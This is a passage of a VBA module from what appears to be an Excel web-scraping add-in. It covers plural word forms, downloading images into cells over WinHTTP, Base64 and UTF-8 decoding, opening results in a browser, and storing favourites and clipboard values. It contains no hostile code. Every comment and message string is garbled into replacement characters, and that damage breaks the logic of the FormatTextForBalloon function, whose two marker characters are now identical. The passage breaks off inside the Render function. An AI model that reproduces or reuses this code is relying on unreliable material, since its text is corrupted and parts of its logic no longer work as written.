Function PluralForm(ByVal n&, ByVal txt$, Optional AddNumberBefore As Boolean = True) As String
    ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim m&, mm&, f&, arr
    m& = n& Mod 10: mm& = n& Mod 100
    arr = Split(txt, "/")
    
    If (m& = 1) And (mm& <> 11) Then
        f& = 0
    ElseIf (m& >= 2) And (m& <= 4) And ((mm& < 10) Or (mm& >= 20)) Then
        f& = 1
    Else
        f& = 2
    End If
    
    PluralForm = arr(f&)
    If AddNumberBefore Then PluralForm = n& & " " & PluralForm
    ' return $n%10==1&&$n%100!=11?$forms[0]:($n%10>=2&&$n%10<=4&&($n%100<10||$n%100>=20)?$forms[1]:$forms[2]);
End Function

Function GetOptionHeadersArrayFromSheet(ByVal StartCol&) As Variant
    On Error Resume Next
    If ActiveSheet Is Nothing Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation: Exit Function
    
    Dim ra As Range: Set ra = Range(Cells(1, StartCol&), Cells(1, Columns.Count).End(xlToLeft))
    If ra.Column < StartCol& Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel", vbExclamation: Exit Function
    If ra.Columns.Count = 1 Then Exit Function
    GetOptionHeadersArrayFromSheet = Application.Transpose(Application.Transpose(ra.value))
End Function

Sub Parser_ResaveResultExample()
    On Error Resume Next
    If ActiveSheet.Shapes.Count > 0 Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|), |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
        Exit Sub
    End If
    
    Dim FileName$
    FileName$ = Replace(GetWebsiteNameFromParserName(CURRENT_PARSER$), ".", "-")
    ActiveWorkbook.SaveAs PARSERS_FOLDER & FileName$ & "_parser_result_example.xlsx", xlOpenXMLWorkbook
End Sub

Function GetWebsiteNameFromParserName(ByVal txt$) As String
    On Error Resume Next
    With REGEXP
        .Pattern = "[a-zA-Z0-9.-]+"
        If .test(txt) Then GetWebsiteNameFromParserName = .Execute(txt)(0)
    End With
End Function

Function CreateAbsolutePathFromRelative(ByVal FileName$) As String
    On Error Resume Next
    FileName$ = Trim(FileName$): If FileName$ = "" Then Exit Function
    
    Select Case True
        Case FileName$ Like "[A-z]:\?*", FileName$ Like "\\?*\?*"
            CreateAbsolutePathFromRelative = FileName$
        Case FileName$ Like "\[!\]*"
            CreateAbsolutePathFromRelative = ThisWorkbook.Path & FileName$
        Case FileName$ Like "[!\]*"
            CreateAbsolutePathFromRelative = PARSERS_FOLDER & FileName$
    End Select
End Function

Function DEBUG_GetErrorPoint() As String
    On Error Resume Next
    DEBUG_GetErrorPoint = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & DEBUG_LevelInfo$ & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| #" & DEBUG_ActionIndex&
End Function

Function PasteImageIntoCell(ByRef cell As Range, Optional ByVal URL$, _
        Optional AuthMode As Boolean = False, Optional ByRef WP As WebsiteParser) As Boolean
    On Error Resume Next
    'Dim cell As Range: Set cell = ActiveCell
    
    If URL$ = "" Then URL$ = cell.value
    Dim FileName$, img_folder$, oStream As Object
    img_folder$ = FWF.temp_folder & "parser_images\": MkDir img_folder$
    FileName$ = img_folder$ & ConvertURLtoFilename(URL$)
    
    If Not FWF.FileExists(FileName$) Then
        
        
        If AuthMode Then
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            With http
                .Open "GET", URL$, True
                If WP.Options.UseClientCertificate Then .SetClientCertificate WP.Options.ClientCertificateName
                WP.UpdateWinHttpProxySettings ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2019
                .SetTimeouts 3000, 3000, 3000, 5000
                
                .SetRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"
                .SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
                AddRequestHeadersFromStore
                If Not CookiesStore Is Nothing Then .SetRequestHeader "Cookie", GetCookiesFromStore
                
                .Send
                DoEvents
                Dim ResponseHeaders$, ResponseOK As Boolean
                
                If Not .WaitForResponse(4) Then
                    ResponseOK = False
                Else
                    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    ResponseHeaders$ = .GetAllResponseHeaders
                    ResponseOK = Val(.Status) \ 100 = 2
                End If
                
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|
                'Debug.Print .GetAllResponseHeaders
                
                If ResponseOK Then
                    Set oStream = CreateObject("ADODB.Stream")
                    oStream.Open
                    oStream.Type = 1
                    oStream.Write .ResponseBody
                    oStream.SaveToFile FileName$, 2        ' 1 = no overwrite, 2 = overwrite
                    oStream.Close
                    Set oStream = Nothing
                    ' Debug.Print "Downloading file with auth done: Len = " & Len(.ResponseText)
                Else
                    'Debug.Print "error downloading file using WinHTTP: Status = " & .Status
                    Exit Function
                End If
                'ShowText .GetAllResponseHeaders
            End With
        Else
            If Not FWF.DownLoadFileFromURL(URL$, FileName$) Then Exit Function
        End If
        
        
    End If
    
    Dim sha As Shape, w As Single, H As Single, WidthBefore As Single, HeightBefore As Single, ra_w!, ra_h!, wh!
    Set sha = cell.Parent.Shapes.AddPicture(FileName$, msoFalse, msoCTrue, -1, -1, -1, -1)
    With sha
        WidthBefore = .Width
        HeightBefore = .Height
    End With
    
    
    ra_w! = cell.Areas(1).Width
    ra_h! = cell.Areas(1).Height
    Const pad! = 1.5
    wh! = WidthBefore / HeightBefore
    
    w = ra_w! - 2 * pad!
    H = w / wh!
    
    If cell.RowHeight < (H + 2 * pad!) Then cell.RowHeight = (H + 2 * pad!)
    
    sha.Width = w
    sha.Height = H
    
    sha.Top = cell.Top + (cell.Height - sha.Height) / 2
    sha.Left = cell.Left + (cell.Width - sha.Width) / 2
    
    sha.Placement = xlMoveAndSize
    
    PasteImageIntoCell = True
End Function

Function ConvertURLtoFilename(ByVal URL$) As String
    On Error Resume Next: Err.Clear
    URL$ = Replace(URL$, "http://", "")
    URL$ = Replace(URL$, "https://", "")
    If URL$ Like "www.?*" Then URL$ = Mid(URL$, 5)
    URL$ = URLDecode(URL$)
    ConvertURLtoFilename = LCase(Replace_symbols(URL$))
    If Not ConvertURLtoFilename Like "*.jpg" Then ConvertURLtoFilename = ConvertURLtoFilename & ".jpg"
End Function

Sub ShowActionManuals()
    On Error Resume Next
    FWF.FollowHyperlink "https://ExcelVBA.ru/programmes/Parser/actions"
End Sub

Sub ShowManual(ByRef URL$)
    On Error Resume Next
    If IsURL(URL$) Then FWF.FollowHyperlink URL
End Sub

Function FormatTextForBalloon(ByVal txt$, Optional ByVal MaxLen& = 40) As String
    On Error Resume Next
    If Len(txt$) <= MaxLen& Then FormatTextForBalloon = txt$: Exit Function
    txt$ = Replace("|fffd|textarea readonly rows='4' style='width:100%;'|fffd|XXX|fffd|/textarea|fffd|", "XXX", txt$)
    txt$ = Replace(Replace(txt$, ">", "&gt;"), "<", "&lt;")
    txt$ = Replace(Replace(txt$, "|fffd|", ">"), "|fffd|", "<")
    FormatTextForBalloon = txt$
End Function


Function DecodeUTF8(ByVal sInput) As String
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: http://bbs.vbstreets.ru/viewtopic.php?p=6659672#p6659672
    On Error Resume Next
    Dim iCharPos&, iCharCode&, iLoByteCounter&, iLoByteCount&, iLoCharCode&
    Dim iInputLen&: iInputLen = Len(sInput)
    ReDim aUnicode(iInputLen)
    
    For iCharPos = 1 To iInputLen
        aUnicode(iCharPos) = Mid(sInput, iCharPos, 1)
        iCharCode = Asc(aUnicode(iCharPos))
        
        If (iCharCode > 191) Then
            
            If (iCharCode < 224) Then        '110xxxxx prefix for 2 bytes unicode
                iCharCode = iCharCode And 31        'remove the 3 bit two bytes prefix
                iLoByteCount = 1
            ElseIf (iCharCode < 240) Then        '1110xxxx prefix for 3 bytes unicode
                iCharCode = iCharCode And 15        'remove the 4 bit three bytes prefix
                iLoByteCount = 2
            ElseIf (iCharCode < 248) Then        '11110xxx prefix for 4 bytes unicode
                iCharCode = iCharCode And 7        'remove the 5 bit four bytes prefix
                iLoByteCount = 3
            ElseIf (iCharCode < 252) Then        '111110xx prefix for 5 bytes unicode
                iCharCode = iCharCode And 3        'remove the 6 bit five bytes prefix
                iLoByteCount = 4
            Else        '1111110x prefix for 6 bytes unicode
                iCharCode = iCharCode And 1        'remove the 7 bit six bytes prefix
                iLoByteCount = 5
            End If
            
            For iLoByteCounter = 1 To iLoByteCount
                iLoCharCode = Asc(Mid(sInput, iCharPos + iLoByteCounter, 1))        'the next byte
                '|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 6 |fffd||fffd||fffd||fffd||fffd| + 6 |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                iCharCode = iCharCode * 64 + (iLoCharCode And 63)
            Next
            
            aUnicode(iCharPos) = ChrW(iCharCode)
            iCharPos = iCharPos + iLoByteCount
        End If
    Next
    DecodeUTF8 = Join(aUnicode, "")
End Function

Function EncodeBase64(text$) As String
    On Error Resume Next: Dim arrData() As Byte
    arrData = StrConv(text, vbFromUnicode)
    
    Dim objXML As New MSXML2.DOMDocument, objNode As MSXML2.IXMLDOMElement
    Set objNode = objXML.createElement("b64")
    
    objNode.DataType = "bin.base64"
    objNode.nodeTypedValue = arrData
    EncodeBase64 = Replace(objNode.text, vbLf, "")
    
    Set objNode = Nothing: Set objXML = Nothing
End Function

Function DecodeBase64(ByVal strB64$) As String
    On Error Resume Next: Dim strXML$, oXMLDoc, res
    strXML = "<B64DECODE xmlns:dt=" & Chr(34) & "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & _
        "dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & strB64 & "</B64DECODE>"
    Set oXMLDoc = CreateObject("MSXML2.DOMDocument.3.0")
    oXMLDoc.LoadXML (strXML)
    res = oXMLDoc.SelectSingleNode("B64DECODE").nodeTypedValue
    DecodeBase64 = DecodeUTF8(StrConv(res, vbUnicode))
    Set oXMLDoc = Nothing
End Function

Sub PageLoadRequested(ByVal URL$)
    On Error Resume Next: Dim BaseURL$        ' public Const WEBSITE_URL_VARNAME$
    If ParserVariables Is Nothing Then Set ParserVariables = New Dictionary
    BaseURL$ = GetBaseURL(URL$)
    If Len(BaseURL$) Then ParserVariables.item(WEBSITE_URL_VARNAME$) = BaseURL$
    ParserVariables.item(LAST_USED_URL_VARNAME$) = URL$
End Sub

Function FilterArrayBySelection(ByVal list$, SelectionRow&) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| list$ |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - ARSEP)
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| SelectionRow&)
    On Error Resume Next
    FilterArrayBySelection = list$
    Dim sh As Worksheet, ra As Range, cell As Range, coll As New Collection, item, newlist$, txt$
    Set sh = ActiveSheet: If sh Is Nothing Then Debug.Print "Function FilterArrayBySelection error: sheet Is Nothing": Exit Function
    Set ra = Intersect(Selection.EntireColumn, sh.Rows(SelectionRow&), sh.UsedRange)
    If ra Is Nothing Then Debug.Print "Function FilterArrayBySelection error: range Is Nothing": Exit Function
    For Each cell In ra.Cells
        txt = Trim(cell.value)
        If Len(txt) Then coll.Add CStr(txt), CStr(txt)
    Next cell
    
    For Each item In coll
        If ARSEP & list$ & ARSEP Like "*" & ARSEP & item & ARSEP & "*" Then
            newlist$ = newlist$ & IIf(newlist$ = "", "", ARSEP) & item
        End If
    Next
    FilterArrayBySelection = newlist$
End Function

Sub ShowTextInBrowser(ByVal txt$, Optional ByVal BaseURL$, Optional XML_Format As Boolean = False)
    On Error Resume Next: Randomize
    Dim FileName$, arr1, arr2, BaseTag$
    
    If IsURL(txt$) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|
        CreateObject("wscript.shell").Run txt$
        Exit Sub
    End If
    
    FileName$ = Environ("TEMP") & "\test_actions_result_" & Left(Rnd() * 1E+15, 10) & IIf(XML_Format, ".xml", ".html")
    
    If XML_Format Then
        
    Else
        If Not IsURL(BaseURL$) Then
            If IsURL(LAST_USED_URL$) Then BaseURL$ = LAST_USED_URL$
        End If
        If IsURL(BaseURL$) Then BaseTag$ = "<base href=""" & GetBaseURL(BaseURL$) & "/" & """>"
        
        txt = Replace(txt, ARSEP, "<hr>")
        
        If txt Like "*<head*</head>*<body*</body>*" Then
            ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| HEAD |fffd||fffd||fffd| BASE
            arr1 = Split(txt, "<head", 2)
            arr2 = Split(arr1(1), ">", 2)
            arr2(1) = vbNewLine & BaseTag$ & arr2(1)
            arr1(1) = Join(arr2, ">")
            txt = Join(arr1, "<head")
        End If
    End If
    
    With CreateObject("ADODB.Stream")
        .Type = 2: .Charset = "utf-8": .Open
        .WriteText txt$
        .SaveToFile FileName$, 2
        .Close
    End With
    
    CreateObject("wscript.shell").Run """" & FileName$ & """"
End Sub

' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Function IsFavouriteAction(ByVal Codename$) As Boolean
    IsFavouriteAction = ";" & SETT.GetText("FavouritesActions") & ";" Like "*;" & Codename$ & ";*"
End Function

Sub ChangeFavouriteActionsList(ByVal Codename$, ByVal NewState As Boolean)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| codename$ |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim txt$, PresentInList As Boolean
    PresentInList = IsFavouriteAction(Codename$)
    If NewState <> PresentInList Then
        txt$ = ";" & SETT.GetText("FavouritesActions") & ";"
        If NewState Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            txt$ = Codename$ & txt$
        Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            txt$ = Replace(txt$, ";" & Codename$ & ";", ";")
        End If
        RemoveExtraSeparators txt$, ";"
        SETT.SetText "FavouritesActions", txt$
    End If
End Sub

Sub AddActionIntoLastUsedList(ByVal Codename$)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim txt$, arr, i&
    Const LAST_USED_ACTIONS_MAX_COUNT& = 10
    txt$ = ";" & SETT.GetText("LastUsedActions") & ";"
    txt$ = Codename$ & Replace(txt$, ";" & Codename$ & ";", ";")
    RemoveExtraSeparators txt$, ";"
    arr = Split(txt, ";")
    If UBound(arr) >= LAST_USED_ACTIONS_MAX_COUNT& Then
        For i = LAST_USED_ACTIONS_MAX_COUNT& To UBound(arr)
            arr(i) = ""
        Next i
        txt$ = Join(arr, ";"): RemoveExtraSeparators txt$, ";"
    End If
    SETT.SetText "LastUsedActions", txt$
End Sub

' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Function LoadAddinClipboardValues() As Dictionary
    On Error Resume Next
    Set LoadAddinClipboardValues = New Dictionary
    On Error Resume Next: Dim i&, arr, ind&
    arr = GetAllSettings(PROJECT_NAME$, "Clipboard")
    For i = LBound(arr) To UBound(arr)
        If arr(i, 0) Like "text #*" Then
            ind& = Val(Split(arr(i, 0), "text ")(1))
            If ind& Then
                LoadAddinClipboardValues.Add ind&, GetAddinClipboardValue(ind&)
            End If
        End If
    Next i
End Function

Function GetFreeIndex_AddinClipboard() As Long
    On Error Resume Next: Dim i&, arr, ind&
    arr = GetAllSettings(PROJECT_NAME$, "Clipboard")
    For i = LBound(arr) To UBound(arr)
        If arr(i, 0) Like "text #*" Then
            ind& = Val(Split(arr(i, 0), "text ")(1))
            If ind& > GetFreeIndex_AddinClipboard Then GetFreeIndex_AddinClipboard = ind&
        End If
    Next i
    GetFreeIndex_AddinClipboard = GetFreeIndex_AddinClipboard + 1
End Function

Sub SaveAddinClipboardValue(ByVal ind As Variant, ByRef txt$)
    On Error Resume Next
    Dim FileName$, FSO As Object, ts As Object
    If Len(txt) > 10000 Then        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        FileName$ = FWF.temp_filename
        Set FSO = CreateObject("scripting.filesystemobject")
        Set ts = FSO.CreateTextFile(FileName$, True, True)
        ts.Write txt: ts.Close
        Set ts = Nothing: Set FSO = Nothing
        txt = "!file=" & FileName$
    End If
    SaveSetting PROJECT_NAME$, "Clipboard", "text " & ind, txt$
End Sub

Function GetAddinClipboardValue(ByVal ind As Variant) As String
    On Error Resume Next
    GetAddinClipboardValue = GetSetting(PROJECT_NAME$, "Clipboard", "text " & ind, "")
    
    Dim FileName$, FSO As Object, ts As Object
    If GetAddinClipboardValue Like "!file=?*" Then        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        FileName$ = Split(GetAddinClipboardValue, "!file=", 2)(1)
        Set FSO = CreateObject("scripting.filesystemobject")
        Set ts = FSO.OpenTextFile(FileName, 1, True, True)
        GetAddinClipboardValue = ts.ReadAll: ts.Close
        Set ts = Nothing: Set FSO = Nothing
    End If
End Function

Sub DeleteAddinClipboardValues()
    On Error Resume Next
    Dim arr, i&
    arr = GetAllSettings(PROJECT_NAME$, "Clipboard")
    For i = LBound(arr) To UBound(arr)
        If arr(i, 0) Like "text #*" Then DeleteSetting PROJECT_NAME$, "Clipboard", arr(i, 0)
    Next i
End Sub

Sub FillRowVariables(ByRef destCell As Range, Optional ByRef SI As ParserSourceItem, Optional ByVal TestMode As Boolean = False)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| RowVariables, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| ro
    On Error Resume Next
    Set RowVariables = New Dictionary
    RowVariables.Add "{row}", destCell.row
    
    Dim cell As Range, link$, ColumnOffset&, SourceRow As Range, FoundCell As Range
    '    If SI.Parent.Mode = ps_SheetRange Then
    '        If TestMode Then Set FoundCell = ActiveCell Else Set FoundCell = SI.SheetRangeMode_Cell
    '    End If
    ColumnOffset& = RunningParser.SourceData.GetColumnOffset
    
    For Each cell In Intersect(destCell.EntireRow, destCell.Worksheet.UsedRange, destCell.Worksheet.Range("a:iv")).Cells
        RowVariables.Add "{" & cell.Column - ColumnOffset& & "}", cell.value
        link$ = "": link$ = GetCellHyperlinkAddress(cell)
        If link$ = "" Then If IsURL(cell.value) Then link$ = Trim(cell.value)
        RowVariables.Add "{" & cell.Column - ColumnOffset& & "@}", link$
        
        If ColumnOffset& Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| {$2} - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            ' |fffd|.|fffd|. {2} - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            RowVariables.Add "{$" & cell.Column & "}", cell.value
            RowVariables.Add "{$" & cell.Column & "@}", link$
        End If
    Next cell
    
    If Not SI Is Nothing Then
        ' If Not (ro.Worksheet Is SI.GetSourceRow.Worksheet) Then
        Set SourceRow = SI.GetSourceRow.EntireRow
        If TestMode Then Set SourceRow = ActiveCell.EntireRow    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Not SourceRow Is Nothing Then
            RowVariables.Add "{row!}", SourceRow.row
            For Each cell In Intersect(SourceRow, SourceRow.Worksheet.UsedRange, SourceRow.Worksheet.Range("a:iv")).Cells
                RowVariables.Add "{" & cell.Column - ColumnOffset& & "!}", cell.value
                link$ = "": link$ = GetCellHyperlinkAddress(cell)
                If link$ = "" Then If IsURL(cell.value) Then link$ = Trim(cell.value)
                RowVariables.Add "{" & cell.Column - ColumnOffset& & "@!}", link$
            Next cell
        End If
        ' End If
    End If
    Set cell = Nothing: Set SourceRow = Nothing
End Sub

Function Replace_Text(ByVal Expression As String, ByVal Find As String, ByVal ReplaceWith As String)
    Replace_Text = Replace(Expression, Find, ReplaceWith, , , vbTextCompare)
    If v_1 Then Replace_Text = Expression
End Function

Function GetCellHyperlinkAddress(ByRef cell As Range, Optional AllowInactiveURL As Boolean = False) As String
    On Error Resume Next
    With cell.MergeArea.Hyperlinks(1)
        GetCellHyperlinkAddress = .Address
        If Len(GetCellHyperlinkAddress) Then
            If Len(.SubAddress) Then GetCellHyperlinkAddress = GetCellHyperlinkAddress & "#" & .SubAddress
        End If
    End With
    If AllowInactiveURL Then If GetCellHyperlinkAddress = "" Then If IsURL(cell.value) Then GetCellHyperlinkAddress = cell.value
    
    Dim txt$, Brackets&, Quotes&, i&
    If GetCellHyperlinkAddress = "" Then
        If cell.Formula Like "=HYPERLINK*" Then
            txt$ = Mid$(cell.Formula, 12)
            txt$ = Left(txt, Len(txt) - 1)
            For i& = 1 To Len(txt)
                Select Case Mid(txt, i, 1)
                    Case "(": Brackets& = Brackets& + 1
                    Case ")": Brackets& = Brackets& - 1
                    Case """": Quotes& = Quotes& + 1
                    Case ","
                        'Debug.Print i, (Brackets& = 0), (Quotes& Mod 2 = 0)
                        If (Brackets& = 0) And (Quotes& Mod 2 = 0) Then
                            txt = Left(txt, i - 1)
                            Exit For
                        End If
                End Select
            Next
            GetCellHyperlinkAddress = Evaluate(txt)
        End If
    End If
    Err.Clear
End Function

Function Render(ByVal txt As String, Optional ByVal ExtendedRender As Boolean = False) As String
    On Error Resume Next
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| {2}) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    Dim key, match As Object, addr$, cell_value$, time_format$, dt As Long, code$
    For Each key In RowVariables.Keys
